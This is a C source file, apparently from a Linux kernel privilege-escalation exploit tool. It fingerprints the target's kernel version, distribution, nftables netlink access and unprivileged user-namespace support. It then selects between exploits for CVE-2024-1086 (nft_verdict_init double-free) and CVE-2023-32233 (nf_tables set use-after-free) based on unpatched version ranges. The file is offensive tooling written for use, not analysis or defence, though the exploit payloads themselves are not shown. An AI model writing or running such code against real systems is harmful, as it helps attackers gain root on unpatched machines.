#include "nfttables.h"

int detect_kernel(struct kernel_info *ki)
{
    struct utsname u;
    if (uname(&u) < 0)
        return -1;

    strncpy(ki->release, u.release, sizeof(ki->release) - 1);

    ki->major = ki->minor = ki->patch = 0;
    sscanf(u.release, "%d.%d.%d", &ki->major, &ki->minor, &ki->patch);

    /* distro detection via os-release */
    ki->distro[0] = '\0';
    FILE *f = fopen("/etc/os-release", "r");
    if (f) {
        char line[256];
        while (fgets(line, sizeof(line), f)) {
            if (strncmp(line, "PRETTY_NAME=", 12) == 0) {
                char *start = line + 12;
                if (*start == '"') start++;
                char *end = start + strlen(start) - 1;
                while (end > start && (*end == '"' || *end == '\n'))
                    *end-- = '\0';
                strncpy(ki->distro, start, sizeof(ki->distro) - 1);
                break;
            }
        }
        fclose(f);
    }

    /* check nftables availability via socket probe */
    int fd = socket(AF_NETLINK, SOCK_RAW | SOCK_CLOEXEC, NETLINK_NETFILTER);
    if (fd >= 0) {
        ki->nft_available = true;
        close(fd);
    } else {
        ki->nft_available = false;
    }

    /* check user namespace support */
    ki->userns_available = false;
    f = fopen("/proc/sys/kernel/unprivileged_userns_clone", "r");
    if (f) {
        int val = 0;
        if (fscanf(f, "%d", &val) == 1)
            ki->userns_available = (val == 1);
        fclose(f);
    } else {
        /* file absent = no sysctl gate = userns generally available
           (most kernels without this sysctl allow unprivileged userns) */
        f = fopen("/proc/sys/user/max_user_namespaces", "r");
        if (f) {
            int val = 0;
            if (fscanf(f, "%d", &val) == 1)
                ki->userns_available = (val > 0);
            fclose(f);
        } else {
            ki->userns_available = true;
        }
    }

    return 0;
}

bool version_in_range(const struct kernel_info *ki,
                      int lo_maj, int lo_min, int lo_pat,
                      int hi_maj, int hi_min, int hi_pat)
{
    uint32_t v  = KVER_OF(ki);
    uint32_t lo = KVER(lo_maj, lo_min, lo_pat);
    uint32_t hi = KVER(hi_maj, hi_min, hi_pat);
    return v >= lo && v <= hi;
}

int pick_exploit(const struct kernel_info *ki)
{
    /*
     * CVE-2024-1086: nft_verdict_init double-free
     * Affected: 3.15 through 6.7.1 (before fix in 6.7.2, 6.6.14, 6.1.75)
     * Most reliable on 5.14+ (dirty pagetable technique requires features
     * from newer kernels).
     *
     * CVE-2023-32233: anonymous set UAF in batch processing
     * Affected: 3.18 through 6.3.1 (fixed in 6.3.2, 6.2.16, 6.1.31)
     */

    bool can_1086 = false;
    bool can_32233 = false;

    /* CVE-2024-1086 version windows (unfixed) */
    if (version_in_range(ki, 6, 7, 0, 6, 7, 1))
        can_1086 = true;
    else if (version_in_range(ki, 6, 6, 0, 6, 6, 13))
        can_1086 = true;
    else if (version_in_range(ki, 6, 1, 0, 6, 1, 74))
        can_1086 = true;
    else if (version_in_range(ki, 5, 14, 0, 6, 0, 255))
        can_1086 = true;

    /* CVE-2023-32233 version windows */
    if (version_in_range(ki, 6, 3, 0, 6, 3, 1))
        can_32233 = true;
    else if (version_in_range(ki, 6, 2, 0, 6, 2, 15))
        can_32233 = true;
    else if (version_in_range(ki, 6, 1, 0, 6, 1, 30))
        can_32233 = true;
    else if (version_in_range(ki, 5, 0, 0, 6, 0, 255))
        can_32233 = true;

    /* prefer 1086 (more reliable exploitation technique) */
    if (can_1086) return MINT_CVE_2024_1086;
    if (can_32233) return MINT_CVE_2023_32233;

    return -1;
}
